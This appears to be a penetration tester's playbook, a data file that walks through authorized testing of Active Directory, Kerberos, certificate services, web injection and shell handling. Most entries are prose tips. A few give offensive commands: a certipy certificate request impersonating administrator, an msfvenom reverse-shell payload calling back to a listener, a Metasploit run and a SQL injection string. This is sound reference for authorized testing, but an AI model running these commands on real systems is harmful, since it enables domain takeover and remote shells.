meta.title: my pl4yb00k
meta.subtitle: A pentester's playbook for fast tool lookup, practical workflows, and clean notes across manuals, flags, and examples.
meta.disclaimer: Use only on systems you own or are explicitly authorized to assess.
principles: Start with scope, logging, and reproducible output so every later finding is easier to prove and report.
Map the surface before you scan it. A clean host, service, and request baseline beats loud guessing every time.
Use automation to accelerate validated signal, not to replace manual understanding of the target.
When access lands, slow down again: stabilize, document, pivot with purpose, and escalate through evidence.

paths.name: Scoping & Setup
paths.summary: Set the assessment up properly, capture evidence early, and build clean baselines before you make noise.

paths.name: Recon & Surface Mapping
paths.summary: Work outward-in: identify what is live, what is exposed, and which parts of the surface deserve deeper testing.

paths.name: Validation & Attack Surface
paths.summary: Turn raw recon into tested entry points with focused discovery, authentication checks, and low-noise validation.

paths.name: Exploitation & Access
paths.summary: Prove impact with controlled exploitation, only enough automation to validate risk, and stable access when it is justified.

paths.name: Post-Exploitation & Escalation
paths.summary: Once you have access, keep it disciplined: move tooling safely, pivot only with a purpose, and escalate through structured enumeration.

paths.name: Active Directory & Domain Ops
paths.summary: Treat domain work as its own lane: enumerate identity, validate Kerberos paths, and keep relay or execution tradecraft tied to clear evidence.

modules.name: Active Directory Enumeration
modules.summary: Build the domain picture first: users, groups, delegation, BloodHound data, and protocol-native AD context before you try to move.

modules.name: AD CS & Ticket Abuse
modules.summary: Handle certificate services, PKINIT, and ticket operations deliberately so certificate abuse and Kerberos pivots stay attributable.

modules.name: API & GraphQL Testing
modules.summary: Replay structured requests cleanly and test auth, route handling, batching, and schema exposure with intent.

modules.name: Application Mapping
modules.summary: Map pages, routes, parameters, client-side state, and trust boundaries before you chase specific bugs.

modules.name: Authentication Testing
modules.summary: Calibrate failure signals, session behavior, MFA, token handling, and lockouts before you automate anything aggressive.

modules.name: Content & Parameter Discovery
modules.summary: Use targeted fuzzing to find directories, parameters, virtual hosts, and hidden routes that actually change the test.

modules.name: Credential Operations
modules.summary: Match the attack to the credential source: online sprays, offline cracking, and target-aware candidate generation.

modules.name: Domain Execution & Secrets
modules.summary: When credentials are real and execution is justified, keep the command path, dump scope, and evidence chain explicit.

modules.name: External Footprinting
modules.summary: Collect DNS, naming, exposed assets, and trust clues so the wider attack surface is grounded in evidence.

modules.name: File Transfer & Tool Staging
modules.summary: Keep a small transfer kit ready so scripts, binaries, and notes move cleanly in either direction.

modules.name: Focused Vulnerability Checks
modules.summary: Run deliberate scans and pattern-based probes after validation so the results stay useful and reviewable.

modules.name: Framework-Assisted Exploitation
modules.summary: Use larger frameworks intentionally: set context once, record every run, and avoid treating them like magic.

modules.name: HTTP Replay & Request Crafting
modules.summary: Build and replay requests cleanly so later tooling is driven by traffic you already understand.

modules.name: Injection & Input Exploitation
modules.summary: Work through injection, upload, traversal, and server-side behaviors methodically so you can prove impact without guessing.

modules.name: Kerberos & Relay
modules.summary: Use roasting, delegation review, and relay tooling only after you understand the directory assumptions, targets, and blast radius.

modules.name: Coercion & Name Resolution Abuse
modules.summary: Build or trigger authentication paths deliberately: monitor first, choose the smallest coercion or name-resolution technique that proves the relay path, and keep cleanup in scope.

modules.name: Linux Host Baseline
modules.summary: Get fast orientation on a Linux host: identity, services, network placement, files, and obvious exposure.

modules.name: Linux Privilege Escalation
modules.summary: Handle Linux escalation as a checklist: sudo, SUID, capabilities, paths, services, and execution context.

modules.name: Network Discovery
modules.summary: Move from host discovery into useful service visibility while saving scans for later validation and reporting.

modules.name: Pivoting & Tunnels
modules.summary: Choose the smallest tunnel that solves the routing problem so you can keep lateral movement understandable.

modules.name: Proxy-First Testing
modules.summary: Use a proxy to capture, replay, and mutate the exact requests that matter before wider automation.

modules.name: Service Enumeration
modules.summary: Use protocol-native clients first so you can prove what common services expose before reaching for exploits.

modules.name: Shells & Payload Delivery
modules.summary: Land a shell, stabilize it, and keep payload generation small and practical for the environment you are in.

modules.name: SQLi Automation
modules.summary: Use sqlmap as a scoped acceleration tool once you already understand the injection point and the request flow.

modules.name: Stack-Specific Validation
modules.summary: When you recognize a common stack, switch to the tooling and checks that fit that ecosystem.

modules.name: Web Surface Mapping
modules.summary: Fingerprint live targets, expand route coverage, and collect technology clues without drowning in noise.

modules.name: Windows Host Baseline
modules.summary: Get the Windows basics pinned down quickly: identity, services, tasks, networking, and local admin context.

modules.name: Windows Privilege Escalation
modules.summary: Re-check the token, services, permissions, startup paths, and common misconfigurations before going heavier.

modules.name: Workspace & Evidence
modules.summary: Keep your workspace repeatable: save output, dedupe lists, and make every recon step easy to replay.

modules.name: Common Application Servers
modules.summary: Validate management surfaces and controlled deployment paths for Tomcat, Jenkins, CGI, and similar application-server targets.

modules.name: Infrastructure & Support Apps
modules.summary: Review Splunk, PRTG, osTicket, GitLab, and other internal support platforms through their native APIs and repository workflows.

modules.name: Thick Client & Code Review
modules.summary: Inspect thick clients, Java artifacts, captured traffic, and rebuilt client packages before testing server-side assumptions.

meta.sources_intro: This playbook groups the saved snippets around a practical pentest flow informed by PTES, OWASP WSTG, and NIST SP 800-115, then keeps the commands tied to upstream tool documentation.

entries.title: Collect Core BloodHound Data
entries.description: Gather directory graph data from a Linux host when you want relationship visibility before deeper lateral-movement decisions.
entries.tip: BloodHound is most useful when paired with careful notes about why a path matters, not just that it exists.
entries.help_menu:
Why: graph data reveals relationships that raw lists can hide.
Use after: validating creds, DNS, and domain controller reachability.

entries.title: Review Delegation Configuration
entries.description: Use the Impacket delegation helper to surface unconstrained, constrained, or resource-based delegation clues in one pass.
entries.tip: Delegation findings are only useful if you tie them back to the service and host path they enable.
entries.help_menu:
Why: delegation settings often explain lateral movement opportunities faster than host-by-host guessing.
Record the target service names and principals, not just the fact that delegation exists.

entries.title: Pull a Directory-Wide User Listing
entries.description: Use the Impacket helper to pull a readable AD user inventory with useful attributes when you need more structure than ad hoc LDAP filters.
entries.tip: This is best used to build a reviewable identity baseline, not as a substitute for understanding which users matter.
entries.help_menu:
Why: a broad user listing helps you spot naming patterns, stale users, service accounts, and likely targets for deeper review.
Export it early so later Kerberos or group findings have context.

entries.title: Request AS-REP Roastable Hashes from a User List
entries.description: Use the Impacket helper to test a focused username list for no-preauth exposure and save any returned material for offline cracking.
entries.tip: A clean username list matters more than spraying a giant unverified dictionary at the KDC.
entries.help_menu:
Why: this keeps AS-REP testing narrow and attributable.
Use when you already have domain naming context or a validated username shortlist.

entries.title: Request Kerberoastable Service Tickets
entries.description: Pull TGS material for SPN-bearing accounts when you already have a validated foothold and want a clean offline cracking handoff.
entries.tip: Service accounts are interesting because of what they can reach, not just because they can be cracked.
entries.help_menu:
Why: this is the cleanest way to tie SPN discovery to actual roast material.
Keep the output file and the target account list together in your evidence folder.

entries.title: Review Kerberoastable Service Accounts
entries.description: Query for SPN-bearing accounts once you already have a validated domain foothold and want to understand service-account exposure.
entries.tip: Even without going further, the presence of service accounts often changes your directory review priorities.
entries.help_menu:
Why: service accounts reveal application boundaries and high-value auth targets.
Use after: validating domain creds and DC reachability.

entries.title: Enumerate Valid AD Usernames
entries.description: Validate a username list against the domain when you need a clean starting point for later credential or auth testing.
entries.tip: A clean user list is often more valuable than noisy guessing.
entries.help_menu:
Why: identity work gets better once you know which usernames are real.
Use with care and keep the target list justified.

entries.title: Pull Domain Users over LDAP
entries.description: Use LDAP directly to query user objects and group data once you have a valid bind and naming context.
entries.tip: LDAP queries are powerful because they stay close to the directory model itself.
entries.help_menu:
Why: LDAP gives you structured directory data straight from the source.
Use for: users, groups, descriptions, SPN-bearing accounts, and trust clues.

entries.title: Enumerate Security Principals by SID
entries.description: Use RID cycling to build quick visibility into domain users and groups when LDAP access is awkward or you want a protocol cross-check.
entries.tip: RID-based output is most useful as a cross-check against LDAP or RPC results, not as your only source of truth.
entries.help_menu:
Why: SID lookups often surface naming and domain clues quickly through a different protocol path.
Use to confirm domain identity structure before you pivot into execution or dumping tools.

entries.title: Enumerate Domain Groups over LDAP
entries.description: Use NetExec LDAP enumeration to turn a valid bind into fast group and membership context before you move deeper.
entries.tip: The value here is understanding who belongs where, not just proving the query works.
entries.help_menu:
Why: group membership usually explains privilege boundaries faster than raw user lists.
Save the exact group names you validated so later BloodHound paths are easier to reason about.

entries.title: Enumerate SMB Shares and Sessions
entries.description: Use NetExec with valid credentials to gather quick share and session context across a host range without switching tools.
entries.tip: This is a fast way to build context, but the value comes from the notes you save afterward.
entries.help_menu:
Why: AD work often starts with quick host-level context across many systems.
Use to map shares, sessions, and authentication reach.

entries.title: Query Domain Info over RPC
entries.description: Use rpcclient when you want legacy RPC-backed domain details that complement LDAP and SMB context.
entries.tip: RPC often fills in details that are awkward to grab elsewhere.
entries.help_menu:
Why: some useful identity and domain information still surfaces well through RPC.
Use to cross-check user and domain context.

entries.title: Authenticate from a PFX and Pull a TGT
entries.description: Use a certificate-backed identity to authenticate and recover Kerberos material once you already know the PFX corresponds to the target principal.
entries.tip: Keep the generated ccache, certificate source, and target identity linked in your notes.
entries.help_menu:
Why: this bridges certificate abuse into Kerberos outcomes.
Record whether you retrieved a TGT, an NT hash, or both, and for which user.

entries.title: Enumerate AD CS Templates and Certificate Authorities
entries.description: Start with a full AD CS inventory so you know which CAs, templates, and escalation paths are actually present before requesting anything.
entries.tip: Save the JSON and BloodHound output early so PKI findings stay tied to the wider domain graph.
entries.help_menu:
Why: AD CS abuse starts with template and CA visibility, not blind requests.
Review enabled templates, enrollment rights, SAN controls, and vulnerable ESC paths.

entries.title: Request a Certificate with a Controlled UPN
entries.description: Request a certificate through a vulnerable or writable template only after you understand why that template should let you set an alternate identity.
entries.command: certipy req -u user@corp.local -p 'Password123!' -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local
entries.tip: Document the template, CA, and exact SAN or UPN you set because that context explains the abuse path.
entries.help_menu:
Why: the dangerous part is not the request itself, but the template permissions and subject controls behind it.
Keep the template rationale and intended identity escalation path explicit.

entries.title: Recover an NT Hash from a PKINIT TGT
entries.description: Use the AS-REP key from a PKINIT TGT to recover the NT hash when the workflow and target privileges justify it.
entries.tip: Double-check the ccache and AS-REP key match the same ticket request or the result will not make sense.
entries.help_menu:
Why: this is the payoff step for a successful PKINIT path.
Track which ticket, which certificate, and which recovered identity or hash belong together.

entries.title: Request a TGT with PKINIT from a Certificate
entries.description: Use a PFX or PEM-backed certificate to request a TGT over PKINIT and save it into a ccache for later ticket operations.
entries.tip: Save the AS-REP encryption key output with the ccache because you may need it for follow-on hash recovery.
entries.help_menu:
Why: PKINIT pivots certificates into Kerberos tickets.
Keep the certificate source, target principal, ccache path, and AS-REP key together.

entries.title: Kerberoast High-Value Accounts with an LDAP Filter
entries.description: Focus roasting on accounts that matter instead of dumping every SPN account in the domain when you already have a narrower hypothesis.
entries.tip: Keep the LDAP filter and the resulting account list so later cracking work stays attributable to specific targets.
entries.help_menu:
Why: targeted roasting is easier to explain and review than broad collection.
Pair the output with account context before you send hashes to hashcat.

entries.title: Request a TGT from an AES Key and Apply It
entries.description: Use a known AES key or hash-backed credential path to request a TGT on a Windows host and inject it into the current session deliberately.
entries.tip: Record whether the ticket came from a password, hash, AES key, or certificate-derived material because that changes the story of the compromise.
entries.help_menu:
Why: Rubeus makes ticket requests and injection fast, but the important part is understanding the credential source and where the ticket lands.
Use /ptt only when you actually need the ticket live in-session.

entries.title: Use S4U to Impersonate a User for a Service Ticket
entries.description: Request and apply an S4U-derived service ticket only after you understand the delegation path and the exact SPN you are targeting.
entries.tip: Log the source ticket, impersonated user, and SPN because S4U paths get confusing fast without disciplined notes.
entries.help_menu:
Why: S4U abuse is powerful but highly context-sensitive.
Capture the delegation assumption, target SPN, and where you injected the resulting ticket.

entries.title: Validate Remote Command Execution over SMB
entries.description: Use NetExec for a fast execution sanity check before switching to a lower-level Impacket exec path.
entries.tip: Treat this as a validation step for reach and privilege, not a substitute for careful execution notes.
entries.help_menu:
Why: this is a fast way to confirm whether the account is really usable for remote actions.
If it works, record the host, privilege context, and execution channel before moving on.

entries.title: Use the Service Drop Exec Path Deliberately
entries.description: Reach for the psexec-style path when the environment and privilege level justify a service-based execution workflow.
entries.tip: This path is powerful, but it should never be the default when you have not already validated access and impact boundaries.
entries.help_menu:
Why: service-based execution is fast and effective, but it leaves a clearer operational footprint.
Use when you can defend why this channel is appropriate for the host and objective.

entries.title: Scope a DC Dump to One High-Value Account
entries.description: Use the scoped DC dump mode when you need a precise credential artifact instead of a broad, noisy directory dump.
entries.tip: Be deliberate about scope here. Dump size and evidence handling matter as much as the command itself.
entries.help_menu:
Why: a scoped dump is easier to justify, store, and explain than a blanket pull.
Record the target account, privilege used, and whether the action touched the DC or a local SAM path.

entries.title: Execute Over SMB Without RemComSvc
entries.description: Use the SMB exec helper when you want an Impacket SMB execution path that behaves differently from the psexec service drop flow.
entries.tip: Know which share, service path, and output channel the tool will use before you lean on it in a live assessment.
entries.help_menu:
Why: alternate exec paths matter when hosts differ in controls, logging, or service behavior.
Document the exact execution method so your later findings stay reproducible.

entries.title: Execute Through WMI When SMB Service Creation Is Unwanted
entries.description: Use the WMI exec path when you want a remote command channel that does not rely on the same service-creation approach as psexec-style tooling.
entries.tip: Choose the exec path that best matches the host context and logging tradeoffs you already understand.
entries.help_menu:
Why: WMI gives you a distinct remote execution path worth comparing against SMB-based methods.
Keep notes on which channel worked, which failed, and what output handling looked like.

entries.title: Add an ADIDNS A Record for a Controlled Hostname
entries.description: Create an LDAP-backed DNS record when you need a host name to resolve toward a relay or operator-controlled IP inside the domain.
entries.tip: Track which name you added, where it points, and which relay path or trust assumption depends on it.
entries.help_menu:
Why: AD-integrated DNS changes can enable cleaner coercion, relay, and service targeting paths.
Use only when the engagement explicitly allows modifying directory-backed records.

entries.title: Query an Existing ADIDNS Record Before You Change It
entries.description: Check the current state of a record first so you understand whether you are modifying an existing name or introducing a new one.
entries.tip: A quick query step prevents accidental collisions with real infrastructure names.
entries.help_menu:
Why: record state matters before any relay, coercion, or cleanup workflow.
Capture the original value so you can restore or explain the change later.

entries.title: Prepare Kerberos Relay Toward LDAP
entries.description: Use the krbrelayx toolkit when the environment and trust assumptions justify Kerberos relay or unconstrained delegation testing.
entries.tip: This only makes sense when you already understand the SPN, target service, and the path that will trigger incoming auth.
entries.help_menu:
Why: Kerberos relay belongs in a dedicated workflow with clear service targeting and environment notes.
Track which trigger path, service principal, and target protocol you are testing.

entries.title: Collect AS-REP Roast Material with LDAP
entries.description: Use NetExec to gather AS-REP roastable output into a file once you have a domain foothold or a valid username list.
entries.tip: Keep the output file named after the target set or date so crack results map back cleanly later.
entries.help_menu:
Why: this keeps AD collection and later cracking tied together cleanly.
Use with: careful account prioritization and a clear offline cracking plan.

entries.title: Collect Kerberoast Material with LDAP
entries.description: Request roastable service tickets through NetExec so service-account review stays in the same AD workflow.
entries.tip: Use the output file as the handoff point into hashcat or John, not as an orphaned artifact.
entries.help_menu:
Why: keep the roast collection path explicit so the resulting account exposure is easy to explain.
Prioritize SPN-bearing accounts that actually matter to the environment.

entries.title: List Objects Trusted for Delegation
entries.description: Use NetExec LDAP enumeration to quickly surface accounts or hosts trusted for delegation before you decide whether deeper relay work is justified.
entries.tip: This should narrow your next step, not replace manual review of what the delegated service can actually do.
entries.help_menu:
Why: delegation exposure changes both attack paths and defensive priority.
Use to shortlist the principals worth deeper Kerberos review.

entries.title: Stand Up a Relay Server with a Target File
entries.description: Prepare a relay server with an explicit target list so any relayed authentication is scoped and auditable instead of ad hoc.
entries.tip: A target file and clear notes matter here because relay work gets confusing fast if you do not track who can hit what.
entries.help_menu:
Why: relay tooling is only useful if the destination set and protocol assumptions are already understood.
Capture the exact targets, relayed protocol, and follow-on access path before you start.

entries.title: Compare Verb, Content-Type, and Batch Behavior
entries.description: Use Repeater to test POST vs GET, JSON vs form encoding, aliases, and batching without changing too many variables at once.
entries.command: Test POST vs GET, JSON vs form encoding, aliases, batching, and introspection gates from Repeater
entries.tip: GraphQL behavior differences are often about how the endpoint is wrapped, not just the query body.
entries.help_menu:
Why: GraphQL endpoints often accept multiple transport styles.
Look for: batched operations, unexpected GET support, and weak auth on introspection or admin fields.

entries.title: Recover a GraphQL Schema When Introspection Is Disabled
entries.description: Use Clairvoyance when suggestion responses are still available and you need to rebuild enough of the schema to keep testing moving.
entries.tip: Feed the recovered schema into a visualizer or Burp extension so you can move from names to testable operations quickly.
entries.help_menu:
Why: disabled introspection does not always mean the schema is truly hidden.
Use target-specific words and collected field names when the default pass misses important types.

entries.title: Run a Basic Introspection Probe
entries.description: Send a compact GraphQL introspection query with explicit JSON semantics so you can quickly learn whether schema discovery is exposed.
entries.tip: Even a blocked response is useful because it tells you the endpoint, transport style, and auth gate you need to compare next.
entries.help_menu:
Why: schema visibility changes how quickly you can map the API.
Compare: auth vs no-auth, GET vs POST, and JSON vs form-style bodies.

entries.title: Fuzz API Routes or Versions
entries.description: Try a focused route wordlist when the application hints at versioned or hidden API paths.
entries.tip: Use route discovery after you already know the host is live and likely serving API content.
entries.help_menu:
Why: API attack surface often hides in alternate versions and route families.
Filter on: status, size, title, and content type.

entries.title: Load a GraphQL Endpoint into GraphQLMap
entries.description: Use GraphQLMap when you want interactive exploration after you have already confirmed the endpoint and auth behavior.
entries.tip: Tooling is more helpful once you have already validated the endpoint manually with curl or a proxy.
entries.help_menu:
Why: GraphQLMap gives you interactive enumeration once the basics are known.
Use for: schema exploration, field discovery, and iterative query work.

entries.title: Replay an Authenticated JSON Request
entries.description: Use HTTPie to replay a bearer-authenticated API request with clean syntax and readable output.
entries.tip: HTTPie is especially nice when you need to iterate quickly on headers and JSON bodies.
entries.help_menu:
Why: API work usually becomes faster once the request syntax stays readable.
Use for: bearer auth, JSON bodies, and response comparison.

entries.title: Scan a GraphQL Endpoint and Generate Queries in Burp
entries.description: Use InQL when you want a richer GraphQL-focused Burp workflow for schema analysis, query generation, and batch attack preparation.
entries.command: Use the InQL Burp extension to analyze a GraphQL endpoint or introspection schema, then send generated queries into Burp tools
entries.tip: Set custom headers per domain before scanning so auth state and tenant context stay accurate.
entries.help_menu:
Why: GraphQL attack surface is easier to reason about once the schema is organized into queries, mutations, and points of interest.
Use generated queries as a starting point, then trim them to the exact behavior you want to test.

entries.title: Pretty-Print and Filter API Responses
entries.description: Pipe JSON responses into jq so large API bodies become readable and you can isolate the fields that matter.
entries.tip: Readable output saves time and keeps your evidence small and concrete.
entries.help_menu:
Why: jq turns bulky API data into something you can actually reason about.
Use for: diffing roles, IDs, scopes, and resource ownership.

entries.title: Inspect a JWT-Centric API Quickly
entries.description: Decode a bearer token and review its claims before you start guessing how authorization is being enforced.
entries.tip: A quick claim review often reveals tenancy, role, audience, or environment assumptions immediately.
entries.help_menu:
Why: APIs often center their trust model around tokens.
Review: claim names, role-like fields, audiences, scopes, and expiration behavior.

entries.title: Search and Select a Module
entries.description: Use a narrow search query to find relevant modules instead of scrolling around the entire framework.
entries.tip: The more specific your search is, the easier it is to stay aligned to the target you actually have.
entries.help_menu:
Why: framework breadth becomes useful only once you can narrow it cleanly.
Search by: service, product, CVE, platform, or module type.

entries.title: Set Targets and Run
entries.description: Keep a clean module workflow by setting the key target and callback values explicitly before you run it.
entries.command:
use exploit/multi/http/example
set RHOSTS 10.10.10.10
set LHOST 10.10.14.10
run
entries.tip: Document the exact module, target, options, and result every time. It saves a lot of confusion later.
entries.help_menu:
Why: explicit module state makes reruns reproducible.
Record: module path, options, session result, and what changed between attempts.

entries.title: Start Metasploit Quietly
entries.description: Launch msfconsole without the extra banner noise when you are moving quickly through a lab workflow.
entries.tip: Set global values like LHOST carefully once, then keep notes on every module run you actually use.
entries.help_menu:
Why: Metasploit is easier to use well when the console stays uncluttered.
Use as a framework with saved notes, not as a button you click at random.

entries.title: Generate a Linux ELF Payload
entries.description: Use msfvenom to generate a simple ELF payload when a lab requires a staged callback artifact.
entries.command: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f elf -o shell.elf
entries.tip: Track which payload format, architecture, and callback values you used. It matters later.
entries.help_menu:
Why: generated payloads are only useful if they match the target and your listener.
Note architecture, payload type, and delivery path.

entries.title: Check DOM Sinks and Tainted Inputs
entries.description: Use the browser and DOM-focused tooling to trace user input into client-side sinks before you start payload work.
entries.command: Use DevTools and DOM Invader to trace location, hash, postMessage, and client-side sinks before testing payloads
entries.tip: Many productive XSS findings come from understanding the data flow, not from a giant payload list.
entries.help_menu:
Why: DOM XSS often hides outside normal server responses.
Look for: location-based routing, client-side template rendering, and sink-heavy utility functions.

entries.title: Confirm an Injection in Repeater
entries.description: Replay the same request with small boolean and quoting changes so you can spot stable differences in the response path.
entries.command: Replay the same request with 1, 1', 1'', and boolean conditions like ' or 1=1-- - to spot stable response changes
entries.tip: Manual confirmation first saves time and keeps automation honest later.
entries.help_menu:
Why: the first goal is confirming behavior, not dumping data.
Look for: status changes, error differences, timing, row counts, or altered page content.

entries.title: Keep a Tiny Validation Payload Set
entries.description: Carry a short payload set for quick context checks instead of pasting a huge list into every input.
entries.tip: The payload matters less than the execution context you are testing.
entries.help_menu:
Why: short, recognizable payloads are easier to reason about and diff.
Adjust for: HTML, attribute, JS string, URL, and event-handler contexts.

entries.title: Test Extension, MIME, and Magic-Byte Controls
entries.description: Alter one upload control at a time so you can see which validation layer the application actually trusts.
entries.command: Change one control at a time: filename, extension, Content-Type, and file header so you can see which check actually matters
entries.tip: When you change too much at once, you lose the signal that tells you which control is weak.
entries.help_menu:
Why: upload validation is usually a chain, not a single check.
Look for: client-side-only checks, MIME-only checks, extension blacklists, and storage path clues.

entries.title: Test Internal Reachability Carefully
entries.description: Use Repeater to compare localhost, RFC1918 ranges, metadata IPs, alternate schemes, and redirect chains without flooding the application.
entries.command: From Repeater, compare localhost, RFC1918, metadata IPs, alternate schemes, and redirect behavior without spamming the target
entries.tip: Server-side work gets noisy fast. Small, deliberate comparisons are usually better than large scans.
entries.help_menu:
Why: careful manual comparisons reveal more than brute forcing internal targets.
Look for: subtle body changes, timing shifts, content length, and callback traffic.

entries.title: Replay a Saved Request Through Commix
entries.description: Point commix at a captured request when headers, body shape, cookies, or content types matter as much as the injectable parameter itself.
entries.tip: Raw-request replay is usually the cleanest way to keep auth, headers, and complex bodies intact during validation.
entries.help_menu:
Why: saved requests keep the automation path anchored to traffic you already trust.
Add tamper logic only when you can explain what filter or parser you are trying to bypass.

entries.title: Run a Focused Command Injection Check Against a URL
entries.description: Use commix once you already have a reason to suspect OS command injection and want a structured automation pass against that input.
entries.tip: This works best when the request path is already validated and the parameter has a believable command-execution shape.
entries.help_menu:
Why: command injection tooling should accelerate a validated signal, not replace the reasoning that found it.
Use after: baseline requests, separators, timing clues, and OAST planning.

entries.title: Baseline an SSRF Parameter
entries.description: Replay a suspected server-side fetch feature against localhost or an internal-style address and compare the behavior carefully.
entries.tip: Focus on response differences, error handling, and redirect behavior before you widen the test.
entries.help_menu:
Why: SSRF testing starts with confirming who actually fetches the URL.
Check: localhost, private IPs, alternate schemes, redirect handling, and whether DNS or HTTP callbacks fire.

entries.title: Basic LFI Traversal Check
entries.description: Probe a suspect file parameter with a short traversal string and see whether the response meaningfully changes.
entries.tip: Use --path-as-is for traversal probes when you need curl to leave dot segments alone.
entries.help_menu:
Why: simple traversal checks confirm whether the app treats the input like a path.
Compare: a normal page, a bogus page, and a traversal target. Use --path-as-is when normalization would hide the test.

entries.title: Boolean-Based Test in a GET Parameter
entries.description: Replay a suspected parameter with a tiny boolean payload to see whether the response changes in a consistent way.
entries.tip: Compare with a deliberately false condition next so you have a clean A/B baseline.
entries.help_menu:
Why: curl is fast for first-pass replay work.
Pair with: a false condition, timing checks, or a captured authenticated request.

entries.title: Check Time-Based Execution
entries.description: Use a short delay payload when output is suppressed and the application gives you little direct feedback.
entries.tip: Take multiple timings and keep the delay short. One slow response is not enough on its own.
entries.help_menu:
Why: timing helps when output is blind.
Keep delays short and compare several requests to reduce false positives.

entries.title: Probe with Common Separators
entries.description: Try a tiny separator payload against a suspect parameter and compare the response with a known-good baseline.
entries.tip: Keep the first payloads small and obvious. The goal is confirmation, not noise.
entries.help_menu:
Why: separators often show whether the input is touching a shell.
Compare with: a normal value and a clearly invalid value.

entries.title: Replay a Multipart Upload
entries.description: Use curl to replay the exact upload flow with a chosen file, cookies, and form fields once you know the request shape.
entries.tip: Start with a known-good file first, then change one control at a time: name, extension, MIME type, or contents.
entries.help_menu:
Why: direct multipart replay makes it easier to test file validation logic.
Change only one control at a time: filename, extension, MIME type, or contents.

entries.title: Test a PHP Wrapper Read
entries.description: Try a read-only PHP wrapper when the app looks like it includes local files but direct traversal is noisy.
entries.tip: Base64 output is often a clearer proof than a broken render or a generic error page.
entries.help_menu:
Why: wrappers can turn a partial include into readable content.
Use when: the target looks PHP-based and the include path is under your control.

entries.title: Time-Based Test in a POST Body
entries.description: Use a short delay payload when the app hides errors and visible content differences stay inconsistent.
entries.tip: Keep the delay short and compare several runs so normal latency does not fool you.
entries.help_menu:
Why: timing is useful when the app gives you very little else.
Check: median response time, retry consistency, and whether caching is involved.

entries.title: Replay Multiple Targets from a File
entries.description: Run a tight XSS validation pass across a curated target list instead of a huge unfiltered crawl.
entries.tip: Keep the input list small and high-signal. Dalfox is better as a validator than a random spray tool.
entries.help_menu:
Why: curated input beats noisy breadth.
Feed it: URLs with real parameters, not an undifferentiated archive dump.

entries.title: Scan a Reflected Input
entries.description: Point Dalfox at a parameterized URL once you have a likely sink and want a fast validation pass.
entries.tip: Dalfox is strongest after you already know which inputs deserve attention.
entries.help_menu:
Why: Dalfox is a practical CLI companion for XSS validation.
Use after: manual context checks, not before.

entries.title: Add a Marker to an Image During Testing
entries.description: Insert a harmless metadata marker so you can tell whether the server preserves or strips file metadata during processing.
entries.tip: Metadata preservation can tell you a lot about the image-processing pipeline even before you look for impact.
entries.help_menu:
Why: metadata handling reveals how the backend processes uploads.
Use this as a marker, not as a shortcut around validation.

entries.title: Fuzz a Suspect Parameter with a Tiny Payload Set
entries.description: Replay the same request with a small command-injection payload set after you already understand the failure baseline.
entries.tip: Keep the wordlist short and specific. Small, explainable payloads win here.
entries.help_menu:
Why: ffuf gives you a controlled way to compare a few high-signal payloads.
Filter on: response size, words, lines, and time.

entries.title: Fuzz Parameter Names Before Testing the Sink
entries.description: Find hidden or alternate parameters before you spend time trying to exploit the wrong one.
entries.tip: A hidden parameter can be more valuable than the obvious one in the front-end form.
entries.help_menu:
Why: the vulnerable input is not always the visible one.
Use for: hidden GET keys, alternate JSON fields, and legacy request names.

entries.title: Fuzz Potential File Parameters
entries.description: Search for alternate parameter names that might drive templates, includes, or language selection.
entries.tip: Sometimes the file parameter exists on a sibling route or a hidden language/theme switch.
entries.help_menu:
Why: the vulnerable path input is not always obvious from the UI.
Check: page, view, file, template, include, lang, and style-like keys.

entries.title: Check the True File Type Before You Upload
entries.description: Verify what your local test file really looks like before you start changing names, headers, or metadata.
entries.tip: Knowing the original file signature makes MIME and magic-byte testing much easier to reason about.
entries.help_menu:
Why: upload controls often inspect more than the extension.
Use to confirm: magic bytes, metadata, and file structure before replaying the upload.

entries.title: Prepare an Out-of-Band Listener
entries.description: Start an interactsh session before you test SSRF, XXE, or other blind server-side behavior.
entries.tip: Blind server-side checks become much easier when the callback infrastructure is ready first.
entries.help_menu:
Why: many server-side behaviors never show up in the normal response.
Use for: DNS and HTTP callback visibility during blind testing.

entries.title: Use OAST for Blind Command Execution
entries.description: Start an interactsh client so you can verify blind callbacks without building your own listener infrastructure first.
entries.tip: Very useful when the app never reflects command output or timing changes are noisy.
entries.help_menu:
Why: out-of-band visibility is cleaner for blind injection checks.
Use for: DNS and HTTP callbacks from code execution or SSRF testing.

entries.title: Scan a Short Target List for Server-Side Findings
entries.description: Run a restrained nuclei pass against confirmed live URLs when you want quick coverage for SSRF, SSTI, and XXE-adjacent issues.
entries.tip: Keep the target list short and rate-limited. Validate any finding manually afterward.
entries.help_menu:
Why: nuclei can widen your coverage after the basics are mapped.
Use after: confirming live URLs and narrowing the scope.

entries.title: Detect the Template Engine on a Suspect Parameter
entries.description: Use SSTImap to identify the server-side template engine and confirm whether the reflected parameter is actually rendering in template context.
entries.tip: SSTI automation is most valuable after you have already proved that the parameter lands in a server-side template sink.
entries.help_menu:
Why: template detection saves time once you know the input is really reaching a render context.
Capture the engine name, context, and confirmed payload shape before deeper actions.

entries.title: Replay a Captured Request Into SSTImap
entries.description: Use a raw request when the injection point lives inside a captured authenticated or non-trivial request rather than a simple GET parameter.
entries.tip: A request file is the safer place to start when cookies, headers, body structure, or CSRF values matter.
entries.help_menu:
Why: replaying the real request helps keep the template probe grounded in the same context you validated manually.
Record which parameter, engine, and response delta made the sink believable.

entries.title: Linux Bash Reverse Shell
entries.description: Keep a standard Bash callback handy for Linux targets where a Bourne-compatible shell is available.
entries.tip: Know which shell is actually present on the target before you assume Bash syntax works.
entries.help_menu:
Why: standard callbacks save time when you need a quick foothold in a lab.
Pair with: a ready listener and immediate TTY stabilization.

entries.title: Catch a Reverse Shell
entries.description: Start a readable listener before you test any callback so the first shell you catch is immediately usable.
entries.tip: rlwrap makes a big difference when you need history or line editing in a rough shell.
entries.help_menu:
Why: a stable listener is the foundation for reverse-shell work.
Set it up before you trigger anything.

entries.title: Upgrade a TTY with Python
entries.description: Use Python to spawn a better interactive shell once you already have a basic shell but need job control and terminal behavior.
entries.tip: This is one of the quickest ways to turn a fragile shell into something more workable.
entries.help_menu:
Why: shell upgrades make every next step easier.
Use after: landing a basic shell and before running anything interactive.

entries.title: Prepare a Better Interactive Channel
entries.description: Use socat when you need a cleaner socket-to-terminal experience than a raw netcat listener usually gives you.
entries.tip: Great tool to have when you know a rough shell is likely but want a cleaner interactive path ready.
entries.help_menu:
Why: socat can be much smoother than a raw listener for interactive work.
